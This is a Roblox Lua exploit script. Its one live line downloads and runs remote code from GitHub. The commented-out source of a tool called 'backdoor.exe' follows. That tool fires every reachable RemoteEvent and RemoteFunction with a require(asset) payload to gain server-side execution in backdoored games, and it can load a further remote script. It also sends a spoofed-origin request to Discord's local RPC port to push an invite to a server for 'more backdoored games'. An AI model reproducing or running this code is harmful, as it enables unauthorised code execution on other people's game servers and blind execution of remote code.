loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v6/source.lua"))()

--[[
    backdoor.exe, the best backdoor scanner in Roblox.
    Copyright (C) 2021	iK4oS

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.


local dateTimeNow = DateTime.now
local tableFind = table.find
local taskSpawn = task.spawn
local taskWait = task.wait
local stringRep = string.rep

local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local JointsService = game:GetService("JointsService")
local StarterGui = game:GetService("StarterGui")

local LocalPlayer = game:GetService("Players").LocalPlayer
local requireScript = ("require(10104304410).k4scripts('%s', %s) -- "):format(LocalPlayer.Name, "true", string.rep("!", 2400)) -- set true to false to disable logging, we add a filler so that the backdoor code won't be send to the chat, by default, only message with 200 characters (or 1,200 bytes) can be send, we multipy it by 2 to be safe.
local invCode = "xJHCqm84cW"

local alternativeSS = {
	run = { [1] = "5#lGIERKWEF" },
	emma = { [1] = "pwojr8hoc0-gr0yxohlgp-0feb7ncxed", [2] = ",,,,,,,,,,,,,,," },
	helpme = { [1] = "helpme" },
	pickett = { [1] = "cGlja2V0dA==" },
	harked = "https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/harkedSS.lua"
}

local function notify(text)
	StarterGui:SetCore(
		"SendNotification",
		{
			Title = "backdoor.exe",
			Duration = 3,
			Text = text
		}
	)
end

local function attached(possibleWait)
	local PlayerGui =  LocalPlayer.PlayerGui
    
	if possibleWait then
		local start = dateTimeNow().UnixTimestampMillis
		local possibleWait = possibleWait * 1000
		while PlayerGui and not PlayerGui:FindFirstChild("backdoor.exe") and (possibleWait > dateTimeNow().UnixTimestampMillis - start) do
			taskWait()
		end
	end

	return PlayerGui and PlayerGui:FindFirstChild("backdoor.exe")
end

local function validRemote(rm)
	local Parent = rm.Parent

	if getgenv().blacklisted then
		if tableFind(getgenv().blacklisted, rm:GetFullName()) then return false end
	end

	if Parent then
		if Parent == JointsService then return false end
        
        -- Addonis Check
		if (Parent == ReplicatedStorage and rm:FindFirstChild("__FUNCTION")) or
        (rm.Name == "__FUNCTION" and Parent.ClassName == "RemoteEvent" and Parent.Parent == ReplicatedStorage) then return false end

-- 		if (Parent.ClassName == "Folder" and Parent.Name == "DefaultChatSystemChatEvents" and Parent.Parent == ReplicatedStorage) then return false end
	end

	if rm:IsDescendantOf(RobloxReplicatedStorage) then return false end

	return true
end

local function harked()
	local backpack = LocalPlayer.Backpack 
	return backpack:FindFirstChild("HandlessSegway") and
		backpack.HandlessSegway:FindFirstChild("RemoteEvents") and
		backpack.HandlessSegway.RemoteEvents:FindFirstChild("DestroySegway")
end
local function emmaBackdoor(rm)
	local Parent = rm.Parent
	return rm.Name == "emma" and Parent and Parent.Name == "mynameemma" and Parent.Parent == ReplicatedStorage
end

local function runBackdoor(rm)
	local Parent = rm.Parent
	return rm.Name == "Run" and Parent and
		Parent:FindFirstChild("Pages") and Parent:FindFirstChild("R6") and
		Parent:FindFirstChild("Version") and Parent:FindFirstChild("Title")
end

local function httpRequest(url)
	if syn and syn.request then return syn.request({Url=url}).Body
	elseif request then return request({Url=url}).Body
	else return game:HttpGetAsync(url) end
end

local function scanGame()
	notify("Scanning for a backdoor.")

	if harked() then
		loadstring(httpRequest(alternativeSS.harked))()
		return
	end

	do
		local DescendantsList = game:GetDescendants()
		for index=1, #DescendantsList do
			if attached() then break end
			local remote = DescendantsList[index]

			if not validRemote(remote) then continue end
			if remote.ClassName ~= "RemoteEvent" then continue end

			if emmaBackdoor(remote) then
				remote:FireServer(unpack(alternativeSS.emma), requireScript)
			end
			if not attached() and runBackdoor(remote) then
				remote:FireServer(unpack(alternativeSS.run), requireScript)
			end

			if not attached() then remote:FireServer(unpack(alternativeSS.helpme), requireScript) end
			if not attached() then remote:FireServer(unpack(alternativeSS.pickett), requireScript) end
			if not attached() then remote:FireServer(requireScript) end

		end
		if attached() then return end

		for index=1, #DescendantsList do
			if attached() then break end
			local remote = DescendantsList[index]

			if not validRemote(remote) then continue end
			if remote.ClassName ~= "RemoteFunction" then continue end

			local waiting = true
			taskSpawn(function()
				remote:InvokeServer(requireScript)
				waiting = nil
			end)

            -- If RemoteFunction don't respond in 1 second, we skip this one.
			local start = dateTimeNow().UnixTimestampMillis
			while waiting and 1000 > dateTimeNow().UnixTimestampMillis - start do
				taskWait()
			end

		end
	end
end

local function Main()
	local function promtDicordInvite()
    	local httpService = game:GetService("HttpService")
    	local httpRequest = (syn and syn.request) or (httpService and httpService.request) or (http_request)
    
    	if not httpRequest then print("Exploit not supported. No HTTP found.") return end
    	
    	    httpRequest({
        		Url = "http://127.0.0.1:6463/rpc?v=1",
        		Method = "POST",
        
        		Headers = {
        			['Content-Type'] = 'application/json',
        			Origin = 'https://discord.com'
        		},
        
        		Body = httpService:JSONEncode({
        			cmd = 'INVITE_BROWSER',
        			nonce = httpService:GenerateGUID(false),
        			args = {code = invCode}
        		})
        	})
	end
	local Bindable = Instance.new("BindableFunction")
	Bindable.OnInvoke = promtDicordInvite
	StarterGui:SetCore(
		"SendNotification",
		{
			Title = "Discord Server",
			Duration = 10,
			Text = "Join for more backdoored games!\n(Fixed invite)",
			Button1 = "Join",
			Callback = Bindable
		}
	)

	scanGame()

	if not attached(3.5) then
		notify("Unable to find backdoor.\nGame not backdoored?")
	end
end

if game:IsLoaded() then
	pcall(Main)
end

--	k4scripts
--	.------.
--	|4.--. |
--	| :│/: |
--	| :│\: |
--	| '--'4|
--	`------'
]]
